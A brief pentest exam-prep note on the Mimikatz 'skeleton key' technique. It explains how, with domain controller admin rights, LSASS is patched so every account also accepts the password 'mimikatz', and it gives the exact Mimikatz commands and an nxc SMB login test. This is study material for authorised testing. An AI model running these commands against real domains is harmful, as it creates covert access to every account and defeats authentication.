Once you have admin on a DC, Mimikatz can patch LSASS in memory to accept **one extra master password for every account in the domain** — without changing anyone's real password (so nothing looks broken). It doesn't survive a reboot, so it's a same-session persistence trick, not a report-worthy "found vulnerability" — mention it as a technique, don't rely on it for exam points.

```
mimikatz # privilege::debug
mimikatz # misc::skeleton
# Now ANY account authenticates with its real password OR "mimikatz":
nxc smb 192.168.x.100 -u administrator -p mimikatz
```